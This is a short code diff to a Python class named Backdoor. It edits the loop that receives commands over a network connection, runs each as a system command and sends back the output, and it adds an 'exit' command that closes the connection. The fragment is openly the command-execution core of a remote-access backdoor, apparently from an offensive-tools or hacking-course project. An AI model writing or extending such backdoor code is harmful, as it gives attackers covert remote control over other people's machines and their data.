@@ -81,10 +81,13 @@ class Backdoor:
         """
         while True:
             command = self.reliable_receive()
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
+
             # execute command
             command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
-        self.connection.close()
 
 
 if __name__ == "__main__":
